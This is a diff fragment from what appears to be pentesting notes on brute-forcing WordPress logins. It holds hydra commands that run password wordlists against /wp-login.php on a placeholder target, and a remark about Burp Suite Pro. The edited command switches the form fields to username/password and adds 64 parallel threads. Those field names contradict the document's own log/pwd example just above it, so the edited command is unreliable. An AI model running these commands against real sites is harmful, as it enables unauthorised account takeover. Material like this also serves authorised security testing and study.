@@ -41,7 +41,7 @@ hydra -l username -P wordlist.txt TARGETIPADDRESS http-post-form "/wp-login.php:
 ```
 hydra -l username -P wordlist.txt TARGETIPADDRESS http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:is incorrect"
 
-hydra -l admin -P /usr/share/wordlists/SecLists/Passwords/10k_most_common.txt TARGETIPADDRESS http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:is incorrect"
+hydra -l admin -P /usr/share/wordlists/SecLists/Passwords/10k_most_common.txt TARGETIPADDRESS http-post-form "/wp-login.php:username=^USER^&password=^PASS^&wp-submit=Log+In:is incorrect" -t 64
 ```
 
 Use Burp **Pro** suite. \(Can be performed in free but is ridiculously slow\)
